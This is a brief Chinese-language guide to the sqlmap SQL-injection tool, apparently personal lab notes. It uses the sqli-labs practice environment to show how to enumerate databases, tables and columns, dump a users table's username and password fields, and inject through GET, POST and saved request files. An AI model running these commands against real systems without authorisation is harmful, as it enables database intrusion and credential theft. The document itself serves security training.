## sqlmap使用指南

查找数据库

`python sqlmap.py -u "http://localhost/sqli-labs/Less-8/?id=1" --dbs --batch --threads 10`

> -u "访问网址，需带参数"
>
> --dbs 查找数据库
>
> --batch 默认选项
>
> --threads 线程

获取数据库中的表
`python sqlmap.py -u "http://localhost/sqli-labs/Less-8/?id=1" -D security --tables --batch --threads 10`
获取表中的字段名 
`python sqlmap.py -u "http://localhost/sqli-labs/Less-8/?id=1" -D security -T users --columns --batch --threads 10`
获取字段信息 
`python sqlmap.py -u "http://localhost/sqli-labs/Less-8/?id=1" -D security -T users -C username,password --dump --batch --threads 10`

> --technique=     （默认全部使用）
>
> * B       基于布尔的盲注
> * T       基于时间的盲注
> * E      基于报错的注入
> * U      基于UNION查询注入
> * S      基于多语句查询注入
>
> --dump                         存储DBMS数据库的表中的条目
>
> --dump-all                     存储DBMS所有数据库表中的条目
>
> --D db                          指定进行枚举的数据库名称
>
> --T   table                     指定进行枚举的数据库表名称
>
> --C   column                 指定进行枚举的数据库列名称

1.GET参数注入

`sqlmap -u "http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1"`

2.POST参数注入

body

1. `参数1=value1&参数2=value2`

`sqlmap -u "http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1"  --data="id=1"`

2. ~~~HTTP
   -c7eb38bf-7ea1-4fbc-836a-47ceafdfd30a
   Content-Disposition: form-data; name="page”
   Content-Length: 1
   1
   -c7eb38bf-7ea1-4fbc-836a-47ceafdfd30a
   Content-Disposition: form-data; name="search”
   Content-Length: 1
   qqqqq
   -c7eb38bf-7ea1-4fbc-836a-47ceafdfd30a-
   ~~~

`sqlmap -r "d://postrequest.txt"`



参考

[sqlmap详细使用教程](https://blog.csdn.net/smli_ng/article/details/106026901)